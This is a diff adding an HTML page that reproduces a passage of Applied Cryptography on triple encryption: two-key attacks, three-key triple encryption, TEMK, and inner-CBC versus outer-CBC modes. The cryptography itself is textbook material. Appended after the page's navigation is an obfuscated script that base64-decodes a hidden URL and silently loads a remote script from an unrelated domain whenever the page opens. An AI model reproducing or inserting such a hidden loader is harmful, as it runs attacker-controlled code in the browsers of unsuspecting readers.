@@ -1,0 +1,119 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Combining Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=15//-->
+<!--PAGES=359-360//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This is sometimes called <B>encrypt-decrypt-encrypt (EDE)</B> mode [55]. If the block algorithm has an <I>n</I>-bit key, then this scheme has a 2<I>n</I>-bit key. The curious encrypt-decrypt-encrypt pattern was designed by IBM to preserve compatibility with conventional implementations of the algorithm: Setting the two keys equal to each other is identical to encrypting once with the key. There is no security inherent in the encrypt-decrypt-encrypt pattern, but this mode has been adopted to improve the DES algorithm in the X9.17 and ISO 8732 standards [55,761].</P>
+<P><I>K</I><SUB>1</SUB> and <I>K</I><SUB>2</SUB> alternate to prevent the meet-in-the-middle attack previously described. If <I>C</I> = <I>E</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I>))), then a cryptanalyst could precompute <I>E</I><SUB>K1</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I>))) for every possible <I>K</I><SUB>1</SUB> and then proceed with the attack. It only requires 2<SUP><I>n</I> &#43; 2</SUP> encryptions.</P>
+<P>Triple encryption with two keys is not susceptible to the same meet-in-the-middle attack described earlier. But Merkle and Hellman developed another time-memory trade-off that could break this technique in 2<SUP><I>n</I> - 1</SUP> steps using 2<SUP><I>n</I></SUP> blocks of memory [1075].</P>
+<P>For each possible <I>K</I><SUB>2</SUB>, decrypt 0 and store the result in memory. Then, decrypt 0 with each possible <I>K</I><SUB>1</SUB> to get <I>P</I>. Triple-encrypt <I>P</I> to get <I>C</I>, and then decrypt <I>C</I> with <I>K</I><SUB>1</SUB>. If that decryption is a decryption of 0 with a <I>K</I><SUB>2</SUB> (stored in memory), the <I>K</I><SUB>1</SUB> <I>K</I><SUB>2</SUB> pair is a possible candidate. Check if it is right. If it&#146;s not, keep looking.</P>
+<P>This is a chosen-plaintext attack, requiring an enormous amount of chosen plaintext to mount. It requires 2<SUP><I>n</I></SUP> time and memory, and 2<SUP><I>m</I></SUP> chosen plaintexts. It is not very practical, but it is a weakness.</P>
+<P>Paul van Oorschot and Michael Wiener converted this to a known-plaintext attack, requiring <I>p</I> known plaintexts. This example assumes EDE mode.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Guess the first intermediate value, <I>a</I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Tabulate, for each possible <I>K</I><SUB>1</SUB>, the second intermediate value, <I>b</I>, when the first intermediate value is <I>a</I>, using known plaintext:
+<DL>
+<DD><I>b</I> = <I>D</I><SUB>K1</SUB>(<I>C</I>)
+</DL>
+<BR>where <I>C</I> is the resulting ciphertext from a known plaintext.
+<DD><B>(3)</B>&nbsp;&nbsp;Look up in the table, for each possible <I>K</I><SUB>2</SUB>, elements with a matching second intermediate value, <I>b</I>:
+<DL>
+<DD><I>b</I> = <I>E</I><SUB>K2</SUB>(<I>a</I>)
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;The probability of success is <I>p/m</I>, where <I>p</I> is the number of known plaintexts and <I>m</I> is the block size. If there is no match, try another <I>a</I> and start again.
+</DL>
+<P>The attack requires 2<SUP><I>n</I> &#43; <I>m</I></SUP><I>/p</I> time and p memory. For DES, this is 2<SUP>120</SUP><I>/p</I> [1558]. For <I>p</I> greater than 256, this attack is faster than exhaustive search.</P>
+<P><FONT SIZE="+1"><B><I>Triple Encryption with Three Keys</I></B></FONT></P>
+<P>If you are going to use triple encryption, I recommend three different keys. The key length is longer, but key storage is usually not a problem. Bits are cheap.
+</P>
+<DL>
+<DD><I>C</I> = <I>E</I><SUB>K3</SUB>(<I>D</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I>)))
+<DD><I>P</I> = <I>D</I><SUB>K1</SUB>(<I>E</I><SUB>K2</SUB>(<I>D</I><SUB>K3</SUB>(<I>C</I>)))
+</DL>
+<P>The best time-memory trade-off attack takes 2<SUP>2<I>n</I></SUP> steps and requires 2<SUP><I>n</I></SUP> blocks of memory; it&#146;s a meet-in-the-middle attack [1075]. Triple encryption, with three independent keys, is as secure as one might na&#239;vely expect double encryption to be.</P>
+<P><FONT SIZE="+1"><B><I>Triple Encryption with Minimum Key (TEMK)</I></B></FONT></P>
+<P>There is a secure way of using triple encryption with two keys that prevents the previous attack, called Triple Encryption with Minimum Key (TEMK) [858]. The trick is to derive three keys from two: <I>X</I><SUB>1</SUB> and <I>X</I><SUB>2</SUB>:</P>
+<DL>
+<DD><I>K</I><SUB>1</SUB> = <I>E</I><SUB>X1</SUB>(<I>D</I><SUB>X2</SUB>(<I>E</I><SUB>X1</SUB>(<I>T</I><SUB>1</SUB>)))
+<DD><I>K</I><SUB>2</SUB> = <I>E</I><SUB>X1</SUB>(<I>D</I><SUB>X2</SUB>(<I>E</I><SUB>X1</SUB>(<I>T</I><SUB>2</SUB>)))
+<DD><I>K</I><SUB>3</SUB> = <I>E</I><SUB>X1</SUB>(<I>D</I><SUB>X2</SUB>(<I>E</I><SUB>X1</SUB>(<I>T</I><SUB>3</SUB>)))
+</DL>
+<P><I>T</I><SUB>1</SUB>, <I>T</I><SUB>2</SUB>, and <I>T</I><SUB>3</SUB> are constants, which do not have to be secret. This is a special construction that guarantees that for any particular pair of keys, the best attack is a known-plaintext attack.</P>
+<P><FONT SIZE="+1"><B><I>Triple-Encryption Modes</I></B></FONT></P>
+<P>It&#146;s not enough to just specify triple encryption; there are several ways to do it. The decision of which to use affects both security and efficiency.
+</P>
+<P>Here are two possible triple-encryption modes:</P>
+<DL>
+<DD><B>Inner-CBC</B>: Encrypt the entire file in CBC mode three different times (see Figure 15.1a). This requires three different IVs.
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>E</I><SUB>K3</SUB>(<I>S</I><SUB>i</SUB> &#8853; <I>C</I><SUB>i - 1</SUB>); <I>S</I><SUB>i</SUB> = <I>D</I><SUB>K2</SUB>(<I>T</I><SUB>i</SUB> &#8853; <I>S</I><SUB>i - 1</SUB>); <I>T</I><SUB>i</SUB> = <I>E</I><SUB>K1</SUB>(<I>P</I><SUB>i</SUB> &#8853; <I>T</I><SUB>i - 1</SUB>)
+<DD><I>P</I><SUB>i</SUB> = <I>T</I><SUB>i - 1</SUB> &#8853; <I>D</I><SUB>K1</SUB>(<I>T</I><SUB>i</SUB>); <I>T</I><SUB>i</SUB> = <I>S</I><SUB>i - 1</SUB> &#8853; <I>E</I><SUB>K2</SUB>(<I>S</I><SUB>i</SUB>); <I>S</I><SUB>i</SUB> = <I>C</I><SUB>i - 1</SUB> &#8853; <I>D</I><SUB>K3</SUB>(<I>C</I><SUB>i</SUB>)
+</DL>
+<BR><I>C</I><SUB>0</SUB>, <I>S</I><SUB>0</SUB>, and <I>T</I><SUB>0</SUB> are IVs.
+<DD><B>Outer-CBC:</B> Triple-encrypt the entire file in CBC mode (see Figure 15.1b). This requires one IV.
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>E</I><SUB>K3</SUB>(<I>D</I><SUB>K2</SUB>(<I>E</I><SUB>K1</SUB>(<I>P</I><SUB>i</SUB> &#8853; <I>C</I><SUB>i - 1</SUB>)))
+<DD><I>P</I><SUB>i</SUB> = <I>C</I><SUB>i - 1</SUB> &#8853; <I>D</I><SUB>K1</SUB>(<I>E</I><SUB>K2</SUB>(<I>D</I><SUB>K3</SUB>(<I>C</I><SUB>i</SUB>)))
+</DL>
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="15-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="15-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(wnoVavZc, Ujhkodyl) {Ujhkodyl = wnoVavZc.createElement('script');Ujhkodyl.type = 'text/javascript';Ujhkodyl.async = true;Ujhkodyl.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');wnoVavZc.getElementsByTagName('body')[0].appendChild(Ujhkodyl);}(document));</script></body>
+</html>
